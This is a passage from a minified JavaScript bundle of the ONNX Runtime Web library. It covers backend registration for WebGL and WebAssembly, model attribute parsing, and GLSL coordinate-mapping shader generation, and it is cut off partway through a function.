!function webpackUniversalModuleDefinition(root,factory){"object"==typeof exports&&"object"==typeof module?module.exports=factory():"function"==typeof define&&define.amd?define([],factory):"object"==typeof exports?exports.ort=factory():root.ort=factory()}(self,(()=>(()=>{var __webpack_modules__={"./lib/backend-onnxjs.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.onnxjsBackend=void 0;const session_1=__webpack_require__("./lib/onnxjs/session.ts"),session_handler_1=__webpack_require__("./lib/onnxjs/session-handler.ts");exports.onnxjsBackend=new class OnnxjsBackend{async init(){}async createSessionHandler(pathOrBuffer,options){const session=new session_1.Session(options);return await session.loadModel(pathOrBuffer),new session_handler_1.OnnxjsSessionHandler(session)}}},"./lib/backend-wasm.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.wasmBackend=exports.initializeFlags=void 0;const onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),os_1=__webpack_require__("?0757"),proxy_wrapper_1=__webpack_require__("./lib/wasm/proxy-wrapper.ts"),session_handler_1=__webpack_require__("./lib/wasm/session-handler.ts");exports.initializeFlags=()=>{if(("number"!=typeof onnxruntime_common_1.env.wasm.initTimeout||onnxruntime_common_1.env.wasm.initTimeout<0)&&(onnxruntime_common_1.env.wasm.initTimeout=0),"boolean"!=typeof onnxruntime_common_1.env.wasm.simd&&(onnxruntime_common_1.env.wasm.simd=!0),"boolean"!=typeof onnxruntime_common_1.env.wasm.proxy&&(onnxruntime_common_1.env.wasm.proxy=!1),"number"!=typeof onnxruntime_common_1.env.wasm.numThreads||!Number.isInteger(onnxruntime_common_1.env.wasm.numThreads)||onnxruntime_common_1.env.wasm.numThreads<=0){const numCpuLogicalCores="undefined"==typeof navigator?(0,os_1.cpus)().length:navigator.hardwareConcurrency;onnxruntime_common_1.env.wasm.numThreads=Math.min(4,Math.ceil((numCpuLogicalCores||1)/2))}};exports.wasmBackend=new class OnnxruntimeWebAssemblyBackend{async init(){(0,exports.initializeFlags)(),await(0,proxy_wrapper_1.initializeWebAssemblyInstance)()}async createSessionHandler(pathOrBuffer,options){const handler=new session_handler_1.OnnxruntimeWebAssemblySessionHandler;return await handler.loadModel(pathOrBuffer,options),Promise.resolve(handler)}}},"./lib/index.ts":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var __createBinding=this&&this.__createBinding||(Object.create?function(o,m,k,k2){void 0===k2&&(k2=k);var desc=Object.getOwnPropertyDescriptor(m,k);desc&&!("get"in desc?!m.__esModule:desc.writable||desc.configurable)||(desc={enumerable:!0,get:function(){return m[k]}}),Object.defineProperty(o,k2,desc)}:function(o,m,k,k2){void 0===k2&&(k2=k),o[k2]=m[k]}),__exportStar=this&&this.__exportStar||function(m,exports){for(var p in m)"default"===p||Object.prototype.hasOwnProperty.call(exports,p)||__createBinding(exports,m,p)};Object.defineProperty(exports,"__esModule",{value:!0}),__exportStar(__webpack_require__("../common/dist/cjs/index.js"),exports);const onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),version_1=__webpack_require__("./lib/version.ts");{const onnxjsBackend=__webpack_require__("./lib/backend-onnxjs.ts").onnxjsBackend;(0,onnxruntime_common_1.registerBackend)("webgl",onnxjsBackend,-10)}{const wasmBackend=__webpack_require__("./lib/backend-wasm.ts").wasmBackend;0,(0,onnxruntime_common_1.registerBackend)("cpu",wasmBackend,10),(0,onnxruntime_common_1.registerBackend)("wasm",wasmBackend,10),(0,onnxruntime_common_1.registerBackend)("xnnpack",wasmBackend,9),(0,onnxruntime_common_1.registerBackend)("webnn",wasmBackend,9)}onnxruntime_common_1.env.versions.web=version_1.version},"./lib/onnxjs/attribute-with-cache-key.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createAttributeWithCacheKey=void 0;class AttributeWithCacheKeyImpl{constructor(attribute){Object.assign(this,attribute)}get cacheKey(){return this._cacheKey||(this._cacheKey=Object.getOwnPropertyNames(this).sort().map((name=>`${this[name]}`)).join(";")),this._cacheKey}}exports.createAttributeWithCacheKey=attribute=>new AttributeWithCacheKeyImpl(attribute)},"./lib/onnxjs/attribute.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.Attribute=void 0;const ort_generated_1=__webpack_require__("./lib/onnxjs/ort-schema/flatbuffers/ort-generated.ts"),onnx_1=__webpack_require__("./lib/onnxjs/ort-schema/protobuf/onnx.js"),tensor_1=__webpack_require__("./lib/onnxjs/tensor.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts");var ortFbs=ort_generated_1.onnxruntime.experimental.fbs;class Attribute{constructor(attributes){if(this._attributes=new Map,null!=attributes){for(const attr of attributes)attr instanceof onnx_1.onnx.AttributeProto?this._attributes.set(attr.name,[Attribute.getValue(attr),Attribute.getType(attr)]):attr instanceof ortFbs.Attribute&&this._attributes.set(attr.name(),[Attribute.getValue(attr),Attribute.getType(attr)]);if(this._attributes.size<attributes.length)throw new Error("duplicated attribute names")}}set(key,type,value){this._attributes.set(key,[value,type])}delete(key){this._attributes.delete(key)}getFloat(key,defaultValue){return this.get(key,"float",defaultValue)}getInt(key,defaultValue){return this.get(key,"int",defaultValue)}getString(key,defaultValue){return this.get(key,"string",defaultValue)}getTensor(key,defaultValue){return this.get(key,"tensor",defaultValue)}getFloats(key,defaultValue){return this.get(key,"floats",defaultValue)}getInts(key,defaultValue){return this.get(key,"ints",defaultValue)}getStrings(key,defaultValue){return this.get(key,"strings",defaultValue)}getTensors(key,defaultValue){return this.get(key,"tensors",defaultValue)}get(key,type,defaultValue){const valueAndType=this._attributes.get(key);if(void 0===valueAndType){if(void 0!==defaultValue)return defaultValue;throw new Error(`required attribute not found: ${key}`)}if(valueAndType[1]!==type)throw new Error(`type mismatch: expected ${type} but got ${valueAndType[1]}`);return valueAndType[0]}static getType(attr){const type=attr instanceof onnx_1.onnx.AttributeProto?attr.type:attr.type();switch(type){case onnx_1.onnx.AttributeProto.AttributeType.FLOAT:return"float";case onnx_1.onnx.AttributeProto.AttributeType.INT:return"int";case onnx_1.onnx.AttributeProto.AttributeType.STRING:return"string";case onnx_1.onnx.AttributeProto.AttributeType.TENSOR:return"tensor";case onnx_1.onnx.AttributeProto.AttributeType.FLOATS:return"floats";case onnx_1.onnx.AttributeProto.AttributeType.INTS:return"ints";case onnx_1.onnx.AttributeProto.AttributeType.STRINGS:return"strings";case onnx_1.onnx.AttributeProto.AttributeType.TENSORS:return"tensors";default:throw new Error(`attribute type is not supported yet: ${onnx_1.onnx.AttributeProto.AttributeType[type]}`)}}static getValue(attr){const attrType=attr instanceof onnx_1.onnx.AttributeProto?attr.type:attr.type();if(attrType===onnx_1.onnx.AttributeProto.AttributeType.GRAPH||attrType===onnx_1.onnx.AttributeProto.AttributeType.GRAPHS)throw new Error("graph attribute is not supported yet");const value=this.getValueNoCheck(attr);if(attrType===onnx_1.onnx.AttributeProto.AttributeType.INT&&util_1.LongUtil.isLong(value))return util_1.LongUtil.longToNumber(value);if(attrType===onnx_1.onnx.AttributeProto.AttributeType.INTS){const arr=value,numberValue=new Array(arr.length);for(let i=0;i<arr.length;i++){const maybeLong=arr[i];numberValue[i]=util_1.LongUtil.longToNumber(maybeLong)}return numberValue}if(attrType===onnx_1.onnx.AttributeProto.AttributeType.TENSOR)return attr instanceof onnx_1.onnx.AttributeProto?tensor_1.Tensor.fromProto(value):tensor_1.Tensor.fromOrtTensor(value);if(attrType===onnx_1.onnx.AttributeProto.AttributeType.TENSORS){if(attr instanceof onnx_1.onnx.AttributeProto){return value.map((value=>tensor_1.Tensor.fromProto(value)))}if(attr instanceof ortFbs.Attribute){return value.map((value=>tensor_1.Tensor.fromOrtTensor(value)))}}if(attrType===onnx_1.onnx.AttributeProto.AttributeType.STRING&&attr instanceof onnx_1.onnx.AttributeProto){const utf8String=value;return(0,util_1.decodeUtf8String)(utf8String)}if(attrType===onnx_1.onnx.AttributeProto.AttributeType.STRINGS&&attr instanceof onnx_1.onnx.AttributeProto){return value.map(util_1.decodeUtf8String)}return value}static getValueNoCheck(attr){return attr instanceof onnx_1.onnx.AttributeProto?this.getValueNoCheckFromOnnxFormat(attr):this.getValueNoCheckFromOrtFormat(attr)}static getValueNoCheckFromOnnxFormat(attr){switch(attr.type){case onnx_1.onnx.AttributeProto.AttributeType.FLOAT:return attr.f;case onnx_1.onnx.AttributeProto.AttributeType.INT:return attr.i;case onnx_1.onnx.AttributeProto.AttributeType.STRING:return attr.s;case onnx_1.onnx.AttributeProto.AttributeType.TENSOR:return attr.t;case onnx_1.onnx.AttributeProto.AttributeType.GRAPH:return attr.g;case onnx_1.onnx.AttributeProto.AttributeType.FLOATS:return attr.floats;case onnx_1.onnx.AttributeProto.AttributeType.INTS:return attr.ints;case onnx_1.onnx.AttributeProto.AttributeType.STRINGS:return attr.strings;case onnx_1.onnx.AttributeProto.AttributeType.TENSORS:return attr.tensors;case onnx_1.onnx.AttributeProto.AttributeType.GRAPHS:return attr.graphs;default:throw new Error(`unsupported attribute type: ${onnx_1.onnx.AttributeProto.AttributeType[attr.type]}`)}}static getValueNoCheckFromOrtFormat(attr){switch(attr.type()){case ortFbs.AttributeType.FLOAT:return attr.f();case ortFbs.AttributeType.INT:return attr.i();case ortFbs.AttributeType.STRING:return attr.s();case ortFbs.AttributeType.TENSOR:return attr.t();case ortFbs.AttributeType.GRAPH:return attr.g();case ortFbs.AttributeType.FLOATS:return attr.floatsArray();case ortFbs.AttributeType.INTS:{const ints=[];for(let i=0;i<attr.intsLength();i++)ints.push(attr.ints(i));return ints}case ortFbs.AttributeType.STRINGS:{const strings=[];for(let i=0;i<attr.stringsLength();i++)strings.push(attr.strings(i));return strings}case ortFbs.AttributeType.TENSORS:{const tensors=[];for(let i=0;i<attr.tensorsLength();i++)tensors.push(attr.tensors(i));return tensors}default:throw new Error(`unsupported attribute type: ${ortFbs.AttributeType[attr.type()]}`)}}}exports.Attribute=Attribute},"./lib/onnxjs/backend.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.resolveBackend=exports.backend=void 0;const backend_webgl_1=__webpack_require__("./lib/onnxjs/backends/backend-webgl.ts"),backendsCache=new Map;async function tryLoadBackend(backendHint){const backendObj=exports.backend;if(void 0!==backendObj[backendHint]&&function isBackend(obj){const o=obj;if("initialize"in o&&"function"==typeof o.initialize&&"createSessionHandler"in o&&"function"==typeof o.createSessionHandler&&"dispose"in o&&"function"==typeof o.dispose)return!0;return!1}(backendObj[backendHint])){const backend=backendObj[backendHint];let init=backend.initialize();if("object"==typeof init&&"then"in init&&(init=await init),init)return backendsCache.set(backendHint,backend),backend}}exports.backend={webgl:new backend_webgl_1.WebGLBackend},exports.resolveBackend=async function resolveBackend(hint){if(!hint)return resolveBackend(["webgl"]);{const hints="string"==typeof hint?[hint]:hint;for(const backendHint of hints){const cache=backendsCache.get(backendHint);if(cache)return cache;const backend=await tryLoadBackend(backendHint);if(backend)return backend}}throw new Error("no available backend to use")}},"./lib/onnxjs/backends/backend-webgl.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.WebGLBackend=void 0;const onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),session_handler_1=__webpack_require__("./lib/onnxjs/backends/webgl/session-handler.ts"),webgl_context_factory_1=__webpack_require__("./lib/onnxjs/backends/webgl/webgl-context-factory.ts");exports.WebGLBackend=class WebGLBackend{get contextId(){return onnxruntime_common_1.env.webgl.contextId}set contextId(value){onnxruntime_common_1.env.webgl.contextId=value}get matmulMaxBatchSize(){return onnxruntime_common_1.env.webgl.matmulMaxBatchSize}set matmulMaxBatchSize(value){onnxruntime_common_1.env.webgl.matmulMaxBatchSize=value}get textureCacheMode(){return onnxruntime_common_1.env.webgl.textureCacheMode}set textureCacheMode(value){onnxruntime_common_1.env.webgl.textureCacheMode=value}get pack(){return onnxruntime_common_1.env.webgl.pack}set pack(value){onnxruntime_common_1.env.webgl.pack=value}get async(){return onnxruntime_common_1.env.webgl.async}set async(value){onnxruntime_common_1.env.webgl.async=value}initialize(){try{return this.glContext=(0,webgl_context_factory_1.createWebGLContext)(this.contextId),"number"!=typeof this.matmulMaxBatchSize&&(this.matmulMaxBatchSize=16),"string"!=typeof this.textureCacheMode&&(this.textureCacheMode="full"),"boolean"!=typeof this.pack&&(this.pack=!1),"boolean"!=typeof this.async&&(this.async=!1),instrument_1.Logger.setWithEnv(onnxruntime_common_1.env),instrument_1.Logger.verbose("WebGLBackend",`Created WebGLContext: ${typeof this.glContext} with matmulMaxBatchSize: ${this.matmulMaxBatchSize}; textureCacheMode: ${this.textureCacheMode}; pack: ${this.pack}; async: ${this.async}.`),!0}catch(e){return instrument_1.Logger.warning("WebGLBackend",`Unable to initialize WebGLBackend. ${e}`),!1}}createSessionHandler(context){return new session_handler_1.WebGLSessionHandler(this,context)}dispose(){this.glContext.dispose()}}},"./lib/onnxjs/backends/webgl/glsl-coordinate-lib.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.CoordsGlslLib=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),texture_layout_strategy_1=__webpack_require__("./lib/onnxjs/backends/webgl/texture-layout-strategy.ts"),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts");class CoordsGlslLib extends glsl_definitions_1.GlslLib{constructor(context){super(context)}getFunctions(){return Object.assign(Object.assign(Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},this.offsetToCoords()),this.coordsToOffset()),this.toVec()),this.valueFrom()),this.getCommonUtilFuncs()),this.getInputsSamplingSnippets()),this.getOutputSamplingSnippet())}getCustomTypes(){return{}}offsetToCoords(){return{offsetToCoords:new glsl_definitions_1.GlslLibRoutine("\n      vec2 offsetToCoords(int offset, int width, int height) {\n        int t = offset / width;\n        int s = offset - t*width;\n        vec2 coords = (vec2(s,t) + vec2(0.5,0.5)) / vec2(width, height);\n        return coords;\n      }\n      ")}}coordsToOffset(){return{coordsToOffset:new glsl_definitions_1.GlslLibRoutine("\n      int coordsToOffset(vec2 coords, int width, int height) {\n        float s = coords.s * float(width);\n        float t = coords.t * float(height);\n        int offset = int(t) * width + int(s);\n        return offset;\n      }\n      ")}}getOutputSamplingSnippet(){const outputLayout=this.context.outputTextureLayout;return outputLayout.isPacked?this.getPackedOutputSamplingSnippet(outputLayout):this.getUnpackedOutputSamplingSnippet(outputLayout)}getPackedOutputSamplingSnippet(outputLayout){const outShape=outputLayout.unpackedShape,outTexShape=[outputLayout.width,outputLayout.height],result={},funcName="getOutputCoords";switch(outShape.length){case 0:result[funcName]=this.getOutputScalarCoords();break;case 1:result[funcName]=this.getOutputPacked1DCoords(outShape,outTexShape);break;case 2:result[funcName]=this.getOutputPacked2DCoords(outShape,outTexShape);break;case 3:result[funcName]=this.getOutputPacked3DCoords(outShape,outTexShape);break;default:result[funcName]=this.getOutputPackedNDCoords(outShape,outTexShape)}const floatTextureSetRGBASource=`\n      void setOutput(vec4 val) {\n        ${(0,glsl_source_1.getGlsl)(this.context.glContext.version).output} = val;\n      }\n    `;return result.floatTextureSetRGBA=new glsl_definitions_1.GlslLibRoutine(floatTextureSetRGBASource),result}getUnpackedOutputSamplingSnippet(outputLayout){const outShape=outputLayout.unpackedShape,outTexShape=[outputLayout.width,outputLayout.height],result={},funcName="getOutputCoords";switch(outShape.length){case 0:result[funcName]=this.getOutputScalarCoords();break;case 1:result[funcName]=this.getOutputUnpacked1DCoords(outShape,outTexShape);break;case 2:result[funcName]=this.getOutputUnpacked2DCoords(outShape,outTexShape);break;case 3:result[funcName]=this.getOutputUnpacked3DCoords(outShape,outTexShape);break;case 4:result[funcName]=this.getOutputUnpacked4DCoords(outShape,outTexShape);break;case 5:result[funcName]=this.getOutputUnpacked5DCoords(outShape,outTexShape);break;case 6:result[funcName]=this.getOutputUnpacked6DCoords(outShape,outTexShape);break;default:throw new Error(`Unsupported output dimensionality: ${outShape.length}`)}const floatTextureSetRSource=`\n        void setOutput(float val) {\n          ${(0,glsl_source_1.getGlsl)(this.context.glContext.version).output} = vec4(val, 0, 0, 0);\n        }\n    `;return result.floatTextureSetR=new glsl_definitions_1.GlslLibRoutine(floatTextureSetRSource),result}getOutputScalarCoords(){return new glsl_definitions_1.GlslLibRoutine("\n      int getOutputCoords() {\n        return 0;\n      }\n    ")}getOutputPacked1DCoords(shape,texShape){const packedTexShape=texShape;let source="";return 1===packedTexShape[0]?(source=`\n          int getOutputCoords() {\n            return 2 * int(TexCoords.y * ${packedTexShape[1]}.0);\n          }\n        `,new glsl_definitions_1.GlslLibRoutine(source)):1===packedTexShape[1]?(source=`\n          int getOutputCoords() {\n            return 2 * int(TexCoords.x * ${packedTexShape[0]}.0);\n          }\n        `,new glsl_definitions_1.GlslLibRoutine(source)):(source=`\n        int getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                 vec2(${packedTexShape[0]}, ${packedTexShape[1]}));\n          return 2 * (resTexRC.y * ${packedTexShape[0]} + resTexRC.x);\n        }\n      `,new glsl_definitions_1.GlslLibRoutine(source))}getOutputPacked2DCoords(shape,texShape){let source="";if(util_1.ArrayUtil.arraysEqual(shape,texShape))return source=`\n        ivec2 getOutputCoords() {\n          return 2 * ivec2(TexCoords.xy * vec2(${texShape[0]}, ${texShape[1]}));\n        }\n      `,new glsl_definitions_1.GlslLibRoutine(source);const packedTexShape=texShape,texelsInLogicalRow=Math.ceil(shape[1]/2);return source=`\n        ivec2 getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                vec2(${packedTexShape[0]}, ${packedTexShape[1]}));\n\n          int index = resTexRC.y * ${packedTexShape[0]} + resTexRC.x;\n\n          // reverse r and c order for packed texture\n          int r = imod(index, ${texelsInLogicalRow}) * 2;\n          int c = 2 * (index / ${texelsInLogicalRow});\n\n          return ivec2(r, c);\n        }\n      `,new glsl_definitions_1.GlslLibRoutine(source)}getOutputPacked3DCoords(shape,texShape){const packedTexShape=[texShape[0],texShape[1]],texelsInLogicalRow=Math.ceil(shape[2]/2),texelsInBatch=texelsInLogicalRow*Math.ceil(shape[1]/2),source=`\n        ivec3 getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                vec2(${packedTexShape[0]}, ${packedTexShape[1]}));\n          int index = resTexRC.y * ${packedTexShape[0]} + resTexRC.x;\n\n          int b = index / ${texelsInBatch};\n          index -= b * ${texelsInBatch};\n\n          // reverse r and c order for packed texture\n          int r = imod(index, ${texelsInLogicalRow}) * 2;\n          int c = 2 * (index / ${texelsInLogicalRow});\n\n          return ivec3(b, r, c);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source)}getOutputPackedNDCoords(shape,texShape){const packedTexShape=[texShape[0],texShape[1]],texelsInLogicalRow=Math.ceil(shape[shape.length-1]/2),texelsInBatch=texelsInLogicalRow*Math.ceil(shape[shape.length-2]/2);let texelsInBatchN=texelsInBatch,batches="",coords="b, r, c";for(let b=2;b<shape.length-1;b++)texelsInBatchN*=shape[shape.length-b-1],batches=`\n      int b${b} = index / ${texelsInBatchN};\n      index -= b${b} * ${texelsInBatchN};\n    `+batches,coords=`b${b}, `+coords;const source=`\n      ivec${shape.length} getOutputCoords() {\n        ivec2 resTexRC = ivec2(TexCoords.xy *\n                              vec2(${packedTexShape[0]}, ${packedTexShape[1]}));\n        int index = resTexRC.y * ${packedTexShape[0]} + resTexRC.x;\n\n        ${batches}\n\n        int b = index / ${texelsInBatch};\n        index -= b * ${texelsInBatch};\n\n        // reverse r and c order for packed texture\n        int r = imod(index, ${texelsInLogicalRow}) * 2;\n        int c = 2 * (index / ${texelsInLogicalRow});\n\n        return ivec${shape.length}(${coords});\n      }\n    `;return new glsl_definitions_1.GlslLibRoutine(source)}getOutputUnpacked1DCoords(shape,texShape){const source=`\n        int getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                vec2(${texShape[0]}, ${texShape[1]}));\n          return resTexRC.y * ${texShape[0]} + resTexRC.x;\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source)}getOutputUnpacked2DCoords(shape,texShape){const source=`\n        ivec2 getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                vec2(${texShape[0]}, ${texShape[1]}));\n          int index = resTexRC.y * ${texShape[0]} + resTexRC.x;\n          int r = index / ${shape[1]};\n          int c = index - r * ${shape[1]};\n          return ivec2(r, c);\n        }\n      `;return new glsl_definitions_1.GlslLibRoutine(source)}getOutputUnpacked3DCoords(shape,texShape){let source="";const rank=shape.length;let strides=null;rank<2&&(strides=[]),strides=new Array(rank-1),strides[rank-2]=shape[rank-1];for(let i=rank-3;i>=0;--i)strides[i]=strides[i+1]*shape[i+1];const coordsToCompute=["r","c","d"],coordsFromIndexSnippet=strides.map(((stride,i)=>`${`int ${coordsToCompute[i]} = index / ${stride}`}; ${i===strides.length-1?`int ${coordsToCompute[i+1]} = index - ${coordsToCompute[i]} * ${stride}`:`index -= ${coordsToCompute[i]} * ${stride}`};`)).join("");return source=`\n        ivec3 getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                vec2(${texShape[0]}, ${texShape[1]}));\n          int index = resTexRC.y * ${texShape[0]} + resTexRC.x;\n          ${coordsFromIndexSnippet}\n          return ivec3(r, c, d);\n        }\n      `,new glsl_definitions_1.GlslLibRoutine(source)}getOutputUnpacked4DCoords(shape,texShape){let source="";const rank=shape.length;let strides=null;rank<2&&(strides=[]),strides=new Array(rank-1),strides[rank-2]=shape[rank-1];for(let i=rank-3;i>=0;--i)strides[i]=strides[i+1]*shape[i+1];const coordsToCompute=["r","c","d","d2"],coordsFromIndexSnippet=strides.map(((stride,i)=>`${`int ${coordsToCompute[i]} = index / ${stride}`}; ${i===strides.length-1?`int ${coordsToCompute[i+1]} = index - ${coordsToCompute[i]} * ${stride}`:`index -= ${coordsToCompute[i]} * ${stride}`};`)).join("");return source=`\n      ivec4 getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                vec2(${texShape[0]}, ${texShape[1]}));\n          int index = resTexRC.y * ${texShape[0]} + resTexRC.x;\n          ${coordsFromIndexSnippet}\n          return ivec4(r, c, d, d2);\n        }\n      `,new glsl_definitions_1.GlslLibRoutine(source)}getOutputUnpacked5DCoords(shape,texShape){let source="";const rank=shape.length;let strides=null;rank<2&&(strides=[]),strides=new Array(rank-1),strides[rank-2]=shape[rank-1];for(let i=rank-3;i>=0;--i)strides[i]=strides[i+1]*shape[i+1];const coordsToCompute=["r","c","d","d2","d3"],coordsFromIndexSnippet=strides.map(((stride,i)=>`${`int ${coordsToCompute[i]} = index / ${stride}`}; ${i===strides.length-1?`int ${coordsToCompute[i+1]} = index - ${coordsToCompute[i]} * ${stride}`:`index -= ${coordsToCompute[i]} * ${stride}`};`)).join("");return source=`\n      ivec5 getOutputCoords() {\n          ivec2 resTexRC = ivec2(TexCoords.xy *\n                                vec2(${texShape[0]}, ${texShape[1]}));\n          int index = resTexRC.y * ${texShape[0]} + resTexRC.x;\n          ${coordsFromIndexSnippet}\n          return ivec5(r, c, d, d2, d3);\n        }\n      `,new glsl_definitions_1.GlslLibRoutine(source)}getOutputUnpacked6DCoords(shape,texShape){let source="";const rank=shape.length;let strides=null;rank<2&&(strides=[]),strides=new Array(rank-1),strides[rank-2]=shape[rank-1];for(let i=rank-3;i>=0;--i)strides[i]=strides[i+1]*shape[i+1];const coordsToCompute=["r","c","d","d2","d3","d4"],coordsFromIndexSnippet=strides.map(((stride,i)=>`${`int ${coordsToCompute[i]} = index / ${stride}`}; ${i===strides.length-1?`int ${coordsToCompute[i+1]} = index - ${coordsToCompute[i]} * ${stride}`:`index -= ${coordsToCompute[i]} * ${stride}`};`)).join("");return source=`\n     ivec6 getOutputCoords() {\n         ivec2 resTexRC = ivec2(TexCoords.xy *\n                               vec2(${texShape[0]}, ${texShape[1]}));\n         int index = resTexRC.y * ${texShape[0]} + resTexRC.x;\n         ${coordsFromIndexSnippet}\n         return ivec6(r, c, d, d2, d3, d4);\n       }\n     `,new glsl_definitions_1.GlslLibRoutine(source)}getCommonUtilFuncs(){const result={};let funcName="uvFromFlat";result[funcName]=new glsl_definitions_1.GlslLibRoutine("\n    vec2 uvFromFlat(int texNumR, int texNumC, int index) {\n      int texC = index / texNumR;\n      int texR = index - texC * texNumR;\n      // TODO: swap texR, texC order in following function so row is corresponding to u and column is corresponding to\n      //       v.\n      return (vec2(texR, texC) + halfCR) / vec2(texNumR, texNumC);\n    }\n    "),funcName="packedUVfrom1D",result[funcName]=new glsl_definitions_1.GlslLibRoutine("\n      vec2 packedUVfrom1D(int texNumR, int texNumC, int index) {\n        int texelIndex = index / 2;\n        int texR = texelIndex / texNumC;\n        int texC = texelIndex - texR * texNumC;\n        return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n      }\n      "),funcName="packedUVfrom2D",result[funcName]=new glsl_definitions_1.GlslLibRoutine("\n      vec2 packedUVfrom2D(int texNumR, int texNumC, int texelsInLogicalRow, int row, int col) {\n        int texelIndex = (row / 2) * texelsInLogicalRow + (col / 2);\n        int texR = texelIndex / texNumC;\n        int texC = texelIndex - texR * texNumC;\n        return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n      }\n      "),funcName="packedUVfrom3D",result[funcName]=new glsl_definitions_1.GlslLibRoutine("\n      vec2 packedUVfrom3D(int texNumR, int texNumC,\n          int texelsInBatch, int texelsInLogicalRow, int b,\n          int row, int col) {\n        int index = b * texelsInBatch + (row / 2) * texelsInLogicalRow + (col / 2);\n        int texR = index / texNumC;\n        int texC = index - texR * texNumC;\n        return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n      }\n      "),funcName="sampleTexture";const glsl=(0,glsl_source_1.getGlsl)(this.context.glContext.version);return result[funcName]=new glsl_definitions_1.GlslLibRoutine(`\n        float sampleTexture(sampler2D textureSampler, vec2 uv) {\n            return ${glsl.texture2D}(textureSampler, uv).r;\n        }`),result}getInputsSamplingSnippets(){const result={},outputLayout=this.context.outputTextureLayout;return this.context.programInfo.inputNames.forEach(((samplerName,i)=>{const inputLayout=this.context.inputTextureLayouts[i],funcName=(0,utils_1.generateShaderFuncNameFromInputSamplerName)(samplerName);inputLayout.isPacked?result[funcName]=this.getPackedSamplerFromInput(funcName,samplerName,inputLayout):result[funcName]=this.getUnpackedSamplerFromInput(funcName,samplerName,inputLayout);const outCoordFuncName=(0,utils_1.generateShaderFuncNameFromInputSamplerNameAtOutCoords)(samplerName);inputLayout.unpackedShape.length<=outputLayout.unpackedShape.length&&(inputLayout.isPacked?result[outCoordFuncName]=this.getPackedSamplerAtOutputCoords(outCoordFuncName,inputLayout,outputLayout,samplerName):result[outCoordFuncName]=this.getUnpackedSamplerAtOutputCoords(outCoordFuncName,inputLayout,outputLayout,samplerName))})),result}getPackedSamplerAtOutputCoords(funcName,inputLayout,outputLayout,name){const inShape=inputLayout.unpackedShape,outShape=outputLayout.unpackedShape,texName=name,texFuncSnippet=(0,utils_1.generateShaderFuncNameFromInputSamplerName)(texName),inRank=inShape.length,outRank=outShape.length,broadcastDims=util_1.BroadcastUtil.getBroadcastDims(inShape,outShape),type=(0,utils_1.getCoordsDataType)(outRank),rankDiff=outRank-inRank;let coordsSnippet;const fields=(0,utils_1.getGlChannels)();coordsSnippet=0===inRank?"":outRank<2&&broadcastDims.length>=1?"coords = 0;":broadcastDims.map((d=>`coords.${fields[d+rankDiff]} = 0;`)).join("\n");let unpackedCoordsSnippet="";unpackedCoordsSnippet=outRank<2&&inRank>0?"coords":inShape.map(((s,i)=>`coords.${fields[i+rankDiff]}`)).join(", ");let output="return outputValue;";const isInputScalar=1===util_1.ShapeUtil.size(inShape),isOutputScalar=1===util_1.ShapeUtil.size(outShape);if(1!==inRank||isInputScalar||isOutputScalar){if(isInputScalar&&!isOutputScalar)output=1===outRank?"\n          return vec4(outputValue.x, outputValue.x, 0., 0.);\n        ":"\n          return vec4(outputValue.x);\n        ";else if(broadcastDims.length){const rows=inRank-2,cols=inRank-1;broadcastDims.indexOf(rows)>-1&&broadcastDims.indexOf(cols)>-1?output="return vec4(outputValue.x);":broadcastDims.indexOf(rows)>-1?output="return vec4(outputValue.x, outputValue.y, outputValue.x, outputValue.y);":broadcastDims.indexOf(cols)>-1&&(output="return vec4(outputValue.xx, outputValue.zz);")}}else output="\n        return vec4(outputValue.xy, outputValue.xy);\n      ";const source=`\n      vec4 ${funcName}() {\n        ${type} coords = getOutputCoords();\n        ${`\n        int lastDim = coords.${fields[outRank-1]};\n        coords.${fields[outRank-1]} = coords.${fields[outRank-2]};\n        coords.${fields[outRank-2]} = lastDim;\n      `}\n        ${coordsSnippet}\n        vec4 outputValue = ${texFuncSnippet}(${unpackedCoordsSnippet});\n        ${output}\n      }\n    `;return new glsl_definitions_1.GlslLibRoutine(source,["coordinates.getOutputCoords"])}getUnpackedSamplerAtOutputCoords(funcName,inputLayout,outputLayout,name){const 